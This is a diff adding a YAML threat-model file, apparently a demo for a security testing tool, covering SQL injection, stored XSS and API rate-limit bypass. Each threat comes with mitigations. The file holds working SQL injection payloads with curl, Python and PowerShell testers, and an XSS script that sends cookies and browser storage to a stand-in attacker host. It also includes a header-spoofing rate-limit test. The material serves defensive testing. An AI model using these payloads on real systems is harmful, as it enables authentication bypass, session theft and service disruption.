@@ -1,0 +1,505 @@
+meta:
+  title: "Enhanced Testing Examples"
+  modelId: "enhanced-testing-demo"
+  version: "1.0"
+  scope: "Demonstration of enhanced security testing features for various threat types"
+  owner: "Security Team"
+  lastUpdated: "2026-01-24"
+
+assets:
+  - ID: "A1"
+    name: "Web Application"
+    type: "Application"
+    trustZone: "DMZ"
+    description: "Public-facing web application with authentication"
+    dataFlows: []
+
+  - ID: "A2"
+    name: "API Gateway"
+    type: "Service"
+    trustZone: "DMZ"
+    description: "REST API gateway handling requests"
+    dataFlows: []
+
+  - ID: "A3"
+    name: "Database"
+    type: "Data Store"
+    trustZone: "Internal"
+    description: "PostgreSQL database with customer data"
+    dataFlows: []
+
+attackers:
+  - REFID: "ATT1"
+    name: "External Attacker"
+    description: "Malicious actor from the internet"
+    motivation: "Data theft, financial gain"
+    capability: "Medium to High"
+
+securityObjectives:
+  - ID: "SO1"
+    name: "Protect Data Integrity"
+    description: "Ensure data cannot be tampered with"
+    category: "Integrity"
+  
+  - ID: "SO2"
+    name: "Prevent Unauthorized Access"
+    description: "Only authenticated users can access resources"
+    category: "Authorization"
+
+threats:
+  # Example 1: SQL Injection
+  - ID: "T1"
+    title: "SQL Injection in Login Form"
+    threatType: "Tampering"
+    attack: "Attacker submits malicious SQL code in the username field to bypass authentication or extract data"
+    impactDesc: "Complete database compromise, authentication bypass, data exfiltration"
+    impactedSecObj:
+      - "Tampering"
+      - "Information Disclosure"
+    attackers:
+      - "ATT1"
+    CVSS:
+      vector: "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H"
+      score: 10.0
+      severity: "Critical"
+    fullyMitigated: false
+    countermeasures:
+      - ID: "CM1"
+        title: "Parameterized Queries"
+        description: "Use prepared statements with parameterized queries"
+        status: "not_started"
+    
+    testPrerequisites:
+      - "Access to the web application login form"
+      - "Burp Suite or similar proxy tool"
+      - "SQLMap installed for automated testing"
+      - "Test credentials or registration capability"
+    
+    testSteps:
+      - "Intercept the login request using Burp Suite"
+      - "Test basic SQL injection: username = admin' OR '1'='1, password = anything"
+      - "Observe if authentication is bypassed"
+      - "Test for error-based injection: username = admin' AND 1=CONVERT(int, (SELECT @@version))--"
+      - "Check if database errors are displayed"
+      - "Use SQLMap to enumerate: sqlmap -u http://target/login --data 'user=test&pass=test' --dbs"
+      - "Extract database names, tables, and data"
+      - "Test blind SQL injection with time-based techniques: admin' AND SLEEP(5)--"
+      - "Document all vulnerable parameters and successful payloads"
+    
+    testScripts:
+      - language: "bash"
+        description: "Quick manual SQL injection test using curl"
+        code: |
+          #!/bin/bash
+          TARGET_URL="$1"
+          
+          echo "[*] Testing SQL Injection on: $TARGET_URL"
+          
+          # Test 1: Classic OR injection
+          echo "[*] Test 1: Classic OR 1=1"
+          curl -X POST "$TARGET_URL/login" \
+            -d "username=admin' OR '1'='1&password=test" \
+            -i | grep -E "HTTP/|Location:|Welcome"
+          
+          # Test 2: Union-based injection
+          echo "[*] Test 2: UNION SELECT"
+          curl -X POST "$TARGET_URL/login" \
+            -d "username=admin' UNION SELECT 1,2,3--&password=test" \
+            -i | head -20
+          
+          # Test 3: Time-based blind
+          echo "[*] Test 3: Time-based (should delay 5 seconds if vulnerable)"
+          time curl -X POST "$TARGET_URL/login" \
+            -d "username=admin' AND SLEEP(5)--&password=test" \
+            --max-time 10
+          
+          echo "[*] Testing complete"
+        requirements:
+          - "curl"
+          - "bash"
+          - "grep"
+      
+      - language: "python"
+        description: "Automated SQL injection tester with multiple payloads"
+        code: |
+          import requests
+          import time
+          
+          def test_sql_injection(target_url):
+              """Test for SQL injection vulnerabilities"""
+              
+              payloads = [
+                  ("Classic OR", "admin' OR '1'='1", "test"),
+                  ("Comment bypass", "admin'--", "anything"),
+                  ("Union select", "admin' UNION SELECT NULL,NULL,NULL--", "test"),
+                  ("Error-based", "admin' AND 1=CONVERT(int, @@version)--", "test"),
+                  ("Time-based", "admin' AND SLEEP(5)--", "test"),
+              ]
+              
+              vulnerabilities = []
+              
+              for name, username, password in payloads:
+                  print(f"[*] Testing: {name}")
+                  
+                  start_time = time.time()
+                  try:
+                      response = requests.post(
+                          f"{target_url}/login",
+                          data={"username": username, "password": password},
+                          timeout=10,
+                          allow_redirects=False
+                      )
+                      elapsed = time.time() - start_time
+                      
+                      # Check for successful bypass
+                      if response.status_code == 302 or "welcome" in response.text.lower():
+                          print(f"[!] VULNERABLE: {name} - Authentication bypassed!")
+                          vulnerabilities.append(name)
+                      
+                      # Check for error messages
+                      elif any(err in response.text.lower() for err in ['sql', 'mysql', 'postgresql', 'syntax']):
+                          print(f"[!] VULNERABLE: {name} - Database error exposed!")
+                          vulnerabilities.append(name)
+                      
+                      # Check for time-based
+                      elif "SLEEP" in username and elapsed > 4:
+                          print(f"[!] VULNERABLE: {name} - Time delay observed ({elapsed:.2f}s)!")
+                          vulnerabilities.append(name)
+                      
+                      else:
+                          print(f"[+] Not vulnerable to: {name}")
+                  
+                  except Exception as e:
+                      print(f"[-] Error testing {name}: {e}")
+              
+              print(f"\n[*] Summary: {len(vulnerabilities)} vulnerabilities found")
+              return vulnerabilities
+          
+          if __name__ == "__main__":
+              import sys
+              if len(sys.argv) < 2:
+                  print("Usage: python test_sqli.py <target-url>")
+                  sys.exit(1)
+              
+              target = sys.argv[1]
+              vulns = test_sql_injection(target)
+              sys.exit(0 if not vulns else 1)
+        requirements:
+          - "requests"
+          - "python3"
+      
+      - language: "powershell"
+        description: "PowerShell script for Windows environments"
+        code: |
+          param(
+              [Parameter(Mandatory=$true)]
+              [string]$TargetUrl
+          )
+          
+          Write-Host "[*] Testing SQL Injection on: $TargetUrl"
+          
+          $payloads = @(
+              @{Name="Classic OR"; User="admin' OR '1'='1"; Pass="test"},
+              @{Name="Comment"; User="admin'--"; Pass="anything"},
+              @{Name="Union"; User="admin' UNION SELECT 1,2,3--"; Pass="test"}
+          )
+          
+          foreach ($payload in $payloads) {
+              Write-Host "[*] Testing: $($payload.Name)"
+              
+              $body = @{
+                  username = $payload.User
+                  password = $payload.Pass
+              }
+              
+              try {
+                  $response = Invoke-WebRequest -Uri "$TargetUrl/login" `
+                      -Method POST -Body $body -MaximumRedirection 0 `
+                      -ErrorAction SilentlyContinue
+                  
+                  if ($response.StatusCode -eq 302 -or $response.Content -like "*welcome*") {
+                      Write-Host "[!] VULNERABLE: $($payload.Name)" -ForegroundColor Red
+                  } else {
+                      Write-Host "[+] Not vulnerable to: $($payload.Name)" -ForegroundColor Green
+                  }
+              } catch {
+                  Write-Host "[-] Error: $_" -ForegroundColor Yellow
+              }
+          }
+        requirements:
+          - "PowerShell 5.1+"
+    
+    testTools:
+      - "Burp Suite Professional"
+      - "SQLMap"
+      - "OWASP ZAP"
+      - "jSQL Injection"
+      - "NoSQLMap"
+    
+    expectedBehavior: "Application accepts malicious SQL in input fields. Database errors are displayed to the user. Authentication can be bypassed with SQL injection payloads. Data can be extracted using UNION or blind techniques."
+    
+    expectedMitigation: "All inputs are properly sanitized. Parameterized queries are used. Database errors are suppressed. Generic error messages are shown. No authentication bypass is possible. Web Application Firewall blocks common SQL injection patterns."
+
+  # Example 2: XSS Attack
+  - ID: "T2"
+    title: "Stored Cross-Site Scripting (XSS)"
+    threatType: "Tampering"
+    attack: "Attacker stores malicious JavaScript in a comment field that executes in other users' browsers"
+    impactDesc: "Session hijacking, credential theft, defacement, malware distribution"
+    impactedSecObj:
+      - "Tampering"
+      - "Information Disclosure"
+    CVSS:
+      vector: "CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:C/C:H/I:H/A:N"
+      score: 8.7
+      severity: "High"
+    fullyMitigated: false
+    
+    testPrerequisites:
+      - "User account with ability to post comments"
+      - "Two browser profiles (attacker and victim)"
+      - "XSS payloads cheat sheet"
+    
+    testSteps:
+      - "Login as attacker user"
+      - "Navigate to comment/post creation area"
+      - "Submit basic XSS payload: <script>alert('XSS')</script>"
+      - "Check if script tag is reflected in HTML source"
+      - "Try alternate payloads: <img src=x onerror=alert('XSS')>"
+      - "Test event handlers: <svg onload=alert('XSS')>"
+      - "If sanitization exists, try obfuscation: <script>eval(atob('YWxlcnQoJ1hTUycpOw=='))</script>"
+      - "Submit payload that steals cookies: <script>fetch('http://attacker.com?c='+document.cookie)</script>"
+      - "Login as victim user in different browser"
+      - "Navigate to page with injected comment"
+      - "Verify if malicious script executes in victim's browser"
+    
+    testScripts:
+      - language: "javascript"
+        description: "XSS payload that exfiltrates session cookies"
+        code: |
+          // Payload to inject in comment field
+          <script>
+          (function() {
+              var attackerUrl = 'https://attacker-controlled-server.com/collect';
+              var payload = {
+                  cookies: document.cookie,
+                  url: window.location.href,
+                  localStorage: JSON.stringify(localStorage),
+                  sessionStorage: JSON.stringify(sessionStorage)
+              };
+              
+              // Send stolen data
+              fetch(attackerUrl, {
+                  method: 'POST',
+                  body: JSON.stringify(payload),
+                  mode: 'no-cors'
+              });
+              
+              // Optionally display something innocent
+              console.log('Loaded successfully');
+          })();
+          </script>
+        requirements:
+          - "Attacker-controlled server to receive data"
+      
+      - language: "python"
+        description: "Automated XSS testing script with multiple payloads"
+        code: |
+          import requests
+          from bs4 import BeautifulSoup
+          
+          def test_xss(base_url, comment_endpoint, login_data=None):
+              """Test for stored XSS vulnerabilities"""
+              
+              session = requests.Session()
+              
+              # Login if credentials provided
+              if login_data:
+                  session.post(f"{base_url}/login", data=login_data)
+              
+              payloads = [
+                  "<script>alert('XSS')</script>",
+                  "<img src=x onerror=alert('XSS')>",
+                  "<svg onload=alert('XSS')>",
+                  "javascript:alert('XSS')",
+                  "<iframe src=javascript:alert('XSS')>",
+                  "<body onload=alert('XSS')>",
+              ]
+              
+              print("[*] Testing for Stored XSS")
+              
+              for i, payload in enumerate(payloads):
+                  print(f"[*] Testing payload {i+1}/{len(payloads)}")
+                  
+                  # Post comment with XSS payload
+                  response = session.post(
+                      comment_endpoint,
+                      data={"comment": payload, "title": "Test"}
+                  )
+                  
+                  if response.status_code == 200:
+                      # Retrieve the page to see if payload persists
+                      page = session.get(comment_endpoint)
+                      
+                      # Check if payload exists in response
+                      if payload in page.text:
+                          print(f"[!] VULNERABLE: Payload {i+1} stored unescaped!")
+                          return True
+                      else:
+                          soup = BeautifulSoup(page.text, 'html.parser')
+                          if soup.find_all('script'):
+                              print(f"[!] POSSIBLE: Script tags found, manual verification needed")
+          
+          if __name__ == "__main__":
+              test_xss("http://target.com", "http://target.com/comments")
+        requirements:
+          - "requests"
+          - "beautifulsoup4"
+          - "python3"
+    
+    testTools:
+      - "Burp Suite Intruder"
+      - "XSStrike"
+      - "OWASP ZAP"
+      - "Browser Developer Tools"
+    
+    expectedBehavior: "Malicious JavaScript is stored in the database without sanitization. When other users view the page, the script executes in their browser context. Session cookies and localStorage are accessible to the injected script."
+    
+    expectedMitigation: "All user input is HTML-encoded before display. Content-Security-Policy headers prevent inline script execution. HTTPOnly flag is set on session cookies. Input validation rejects HTML tags. Output encoding is context-aware."
+
+  # Example 3: API Rate Limiting
+  - ID: "T3"
+    title: "API Rate Limiting Bypass"
+    threatType: "Denial of Service"
+    attack: "Attacker bypasses rate limiting by rotating IP addresses or manipulating request headers"
+    impactDesc: "Resource exhaustion, service degradation, increased costs"
+    impactedSecObj:
+      - "Denial of Service"
+    CVSS:
+      vector: "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H"
+      score: 7.5
+      severity: "High"
+    fullyMitigated: false
+    
+    testPrerequisites:
+      - "API endpoint URL"
+      - "Tools for high-volume requests (Apache Bench, wrk, or custom scripts)"
+      - "Multiple IP addresses or proxy service (optional)"
+    
+    testSteps:
+      - "Identify API endpoint to test"
+      - "Send baseline requests to determine normal rate limit (e.g., 100 req/min)"
+      - "Send requests exceeding the limit from single IP"
+      - "Observe if 429 (Too Many Requests) is returned"
+      - "Rotate IP addresses using proxy or VPN"
+      - "Test if rate limit is bypassed"
+      - "Try manipulating X-Forwarded-For header"
+      - "Test with different User-Agent strings"
+      - "Measure API response time under load"
+    
+    testScripts:
+      - language: "bash"
+        description: "Rate limit stress test using Apache Bench"
+        code: |
+          #!/bin/bash
+          API_URL="$1"
+          REQUESTS="${2:-1000}"
+          CONCURRENCY="${3:-50}"
+          
+          echo "[*] Testing rate limiting on: $API_URL"
+          echo "[*] Sending $REQUESTS requests with concurrency $CONCURRENCY"
+          
+          # Test 1: Normal rate
+          echo "[*] Test 1: Measuring baseline performance"
+          ab -n 100 -c 10 "$API_URL" | grep -E "Requests per second|Time per request|Failed requests"
+          
+          # Test 2: Excessive rate
+          echo "[*] Test 2: Exceeding rate limit"
+          ab -n "$REQUESTS" -c "$CONCURRENCY" "$API_URL" 2>&1 | tee /tmp/ab_results.txt
+          
+          # Analyze results
+          echo "[*] Analyzing results..."
+          grep "429" /tmp/ab_results.txt && echo "[+] Rate limiting detected (429 responses)" || echo "[!] VULNERABLE: No rate limiting enforced"
+          
+          # Check for errors
+          FAILED=$(grep "Failed requests:" /tmp/ab_results.txt | awk '{print $3}')
+          echo "[*] Failed requests: $FAILED"
+        requirements:
+          - "apache2-utils (ab command)"
+          - "bash"
+      
+      - language: "python"
+        description: "Advanced rate limit bypass tester with IP rotation"
+        code: |
+          import requests
+          import time
+          from concurrent.futures import ThreadPoolExecutor
+          
+          def test_rate_limit(url, num_requests=100, workers=10):
+              """Test API rate limiting"""
+              
+              def send_request(i):
+                  headers = {
+                      'User-Agent': f'TestClient-{i}',
+                      'X-Forwarded-For': f'192.168.{i % 255}.{i % 255}'  # Rotate IPs
+                  }
+                  
+                  start = time.time()
+                  try:
+                      response = requests.get(url, headers=headers, timeout=5)
+                      elapsed = time.time() - start
+                      return {
+                          'status': response.status_code,
+                          'time': elapsed,
+                          'headers': dict(response.headers)
+                      }
+                  except Exception as e:
+                      return {'status': 'error', 'error': str(e)}
+              
+              print(f"[*] Sending {num_requests} requests to {url}")
+              print(f"[*] Using {workers} concurrent workers")
+              
+              start_time = time.time()
+              with ThreadPoolExecutor(max_workers=workers) as executor:
+                  results = list(executor.map(send_request, range(num_requests)))
+              total_time = time.time() - start_time
+              
+              # Analyze results
+              status_codes = {}
+              for result in results:
+                  status = result.get('status', 'unknown')
+                  status_codes[status] = status_codes.get(status, 0) + 1
+              
+              print(f"\n[*] Results:")
+              print(f"    Total time: {total_time:.2f}s")
+              print(f"    Requests/sec: {num_requests/total_time:.2f}")
+              
+              for code, count in status_codes.items():
+                  print(f"    {code}: {count} requests")
+              
+              # Check for rate limiting
+              if status_codes.get(429, 0) > 0:
+                  print("[+] Rate limiting detected (429 responses)")
+              else:
+                  print("[!] VULNERABLE: No rate limiting detected")
+          
+          if __name__ == "__main__":
+              import sys
+              if len(sys.argv) < 2:
+                  print("Usage: python test_rate_limit.py <api-url>")
+                  sys.exit(1)
+              
+              test_rate_limit(sys.argv[1], num_requests=200, workers=20)
+        requirements:
+          - "requests"
+          - "python3"
+    
+    testTools:
+      - "Apache Bench (ab)"
+      - "wrk"
+      - "Vegeta"
+      - "Postman Runner"
+    
+    expectedBehavior: "API accepts unlimited requests without throttling. No 429 status codes are returned. Response times remain consistent even under high load. Rate limiting can be bypassed by changing headers or IPs."
+    
+    expectedMitigation: "API returns 429 (Too Many Requests) when limits exceeded. Rate limiting is applied per API key, not just IP. Retry-After header indicates wait time. Response times may degrade but service remains available. IP rotation and header manipulation do not bypass limits."
